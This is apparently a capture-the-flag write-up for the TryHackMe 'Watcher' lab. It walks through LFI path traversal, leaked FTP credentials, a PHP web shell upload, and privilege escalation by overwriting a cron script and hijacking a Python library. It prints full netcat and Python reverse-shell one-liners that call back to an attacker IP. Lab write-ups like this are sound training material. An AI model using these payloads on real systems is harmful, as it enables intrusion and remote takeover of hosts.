# 67 - Watcher (LFI RCE, Python custom library hacking)

Room Link --> [https://tryhackme.com/room/watcher](https://tryhackme.com/room/watcher)

### Enumeration

```
nmap -Pn -n -vv 10.10.177.151 -p- -sV

21/tcp open  ftp     syn-ack vsftpd 3.0.3
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
```

### Flag 1

Navigating to `/robots.txt`&#x20;

```
User-agent: *
Allow: /flag_1.txt
Allow: /secret_file_do_not_read.txt
```

### Flag 2

From the hint we can see a reference to LFI.

Navigating to [http://watcher.thm/post.php?post=/../../../../etc/passwd](http://watcher.thm/post.php?post=/../../../../etc/passwd)

<figure><img src=".gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We see 3 users (will, mat, toby) :(

SO i decided to use SecsLists LFI list to bruteforce and see if i can be able to read any file.

`/opt/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt` .

Then i landed on this:

<figure><img src=".gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

So i tried to read this file and it worked.

Navigating to [http://watcher.thm/post.php?post=secret\_file\_do\_not\_read.txt](http://watcher.thm/post.php?post=secret\_file\_do\_not\_read.txt)

{% code overflow="wrap" %}
```bash
Hi Mat, The credentials for the FTP server are below. I've set the files to be saved to /home/ftpuser/ftp/files. Will ---------- 

# ftp crendentials
ftpuser : givemefiles777
```
{% endcode %}

<figure><img src=".gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Login via ftp and got flag2

<figure><img src=".gitbook/assets/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Flag 3

#### LFI RCE via Abusing Upload Functions

This was provided as a hint --> [blog](https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-2/)

{% hint style="info" %}
Again, our goal is to upload an image with PHP commands included. We will use it to append as a comment our PHP command.
{% endhint %}

I our own case we are able to upload a php file directly from the ftp server.

<figure><img src=".gitbook/assets/image (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Navigate to: [http://watcher.thm/post.php?post=/home/ftpuser/ftp/files/shell.php](http://watcher.thm/post.php?post=/home/ftpuser/ftp/files/shell.php)

And i got shell.

<figure><img src=".gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Flag 3

We find flag3 in `/var/www/html/more_secrets_a9f10a` dir.

### Flag 4

#### Priv Esc to Toby

`sudo -l` - we can execute all cmds as Toby.

`sudo -u toby /bin/bash` - and we are Toby.

<figure><img src=".gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Flag 5

We see a cronjob running as user Mat.

We also have RW permission on the cow.sh file. So we modify it with a rev shell.

`echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.88.214 9001 >/tmp/f' > cow.sh`&#x20;

Setup nc and we get a shell as Mat.

<figure><img src=".gitbook/assets/image (9) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Flag 6

#### Priv Esc to Will

So `sudo -l` we can run a python script as user Will.

We found 2 scripts inside: cmd.py and will\_script.py. Reading the will\_script.py we see that it is a filter script. It restricts the user from running commands other than ls, id and cat /etc/passwd commands. It uses a python library named cmd. The library asks for a numeric entry and then it runs one of the three command mentioned earlier. Since we have library inside the same directory as the script, we can hijack the library to run a reverse shell python script.

<figure><img src=".gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>

we will use the echo command to insert the python reverse shell script inside the python library script is using i.e., cmd.py. After doing so, we will run a netcat listener on the same port that we mentioned inside the reverse shell script. Now all that is left is to run the python script will\_script.py as will user using sudo.

echo 'import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect(("10.10.73.100",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' >> /home/mat/scripts/cmd.pysudo -u will /usr/bin/python3 /home/mat/scripts/will\_script.py \*

<figure><img src="https://1.bp.blogspot.com/-73AhQIG2Mqc/YKqw_dMTW0I/AAAAAAAAwE0/qKfJbi4XISs4NvslUsvYaQ-Tea4m6lLjgCLcBGAsYHQ/s16000/22.png" alt=""><figcaption></figcaption></figure>

After running the script as will user, we get back to our local machine where we ran the netcat listener earlier.

<figure><img src=".gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Priv Esc to root.

So there is a backup dir in the /opt dir. There is a ssh priv key in there it belongs to root.

Done!
